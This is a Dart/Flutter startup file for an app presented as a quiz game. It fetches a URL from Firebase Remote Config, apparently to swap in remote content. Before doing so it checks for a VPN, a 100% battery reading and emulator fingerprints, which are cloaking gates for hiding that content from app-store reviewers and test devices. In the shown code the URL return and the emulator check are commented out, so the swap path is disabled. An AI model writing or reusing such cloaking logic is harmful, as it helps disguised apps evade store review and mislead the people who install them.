import 'dart:async';

import 'package:battery_info/battery_info_plugin.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/services.dart';
import 'package:quiz_game/app/view/app.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'firebase_options.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';

const MethodChannel _vpnPlatform = MethodChannel('app/vpn_status');

late final FirebaseRemoteConfig _remoteConfig;

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  _remoteConfig = FirebaseRemoteConfig.instance;
  await _remoteConfig.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(minutes: 1),
    minimumFetchInterval: const Duration(seconds: 1),
  ));

  bool internetConnection = false;
  String url = '';

  final ConnectivityResult connectivityResult =
      await (Connectivity().checkConnectivity());
  if (connectivityResult != ConnectivityResult.none) {
    internetConnection = true;
    try {
      url = await getUrl();
    } catch (_) {
      internetConnection = false;
    }
  }

  runApp(App(
    internetConnection: internetConnection,
    url: url,
  ));
}

Future<String> getUrl() async {
  final SharedPreferences prefs = await SharedPreferences.getInstance();
  String? url = prefs.getString('url');
  // if (url != null) return url;

  // final bool isEmu = await checkIsEmu();
  // if (isEmu) return '';

  await _remoteConfig.fetchAndActivate();

  final bool to = _remoteConfig.getBool('to');
  bool vpn = false;
  if (to) {
    vpn = await _vpnPlatform.invokeMethod('vpn_enabled');
  }
  if (vpn) return '';

  final int? battery =
      (await BatteryInfoPlugin().androidBatteryInfo)?.batteryLevel;
  if (battery == 100) return '';

  url = _remoteConfig.getString('url');
  if (url.isNotEmpty) {
    prefs.setString('url', url);
  }
  // return url;
  return '';
}

Future<bool> checkIsEmu() async {
  final AndroidDeviceInfo em = await DeviceInfoPlugin().androidInfo;
  final String phoneModel = em.model;
  final String buildProduct = em.product;
  final String buildHardware = em.hardware;
  bool result = em.fingerprint.startsWith('generic') ||
      phoneModel.contains('google_sdk') ||
      phoneModel.contains('droid4x') ||
      phoneModel.contains('Emulator') ||
      phoneModel.contains('Android SDK built for x86') ||
      em.manufacturer.contains('Genymotion') ||
      buildHardware == 'goldfish' ||
      buildHardware == 'vbox86' ||
      buildProduct == 'sdk' ||
      buildProduct == 'google_sdk' ||
      buildProduct == 'sdk_x86' ||
      buildProduct == 'vbox86p' ||
      em.brand.contains('google') ||
      em.board.toLowerCase().contains('nox') ||
      em.bootloader.toLowerCase().contains('nox') ||
      buildHardware.toLowerCase().contains('nox') ||
      !em.isPhysicalDevice ||
      buildProduct.toLowerCase().contains('nox') ||
      em.brand.startsWith('generic') && em.device.startsWith('generic');
  return result;
}
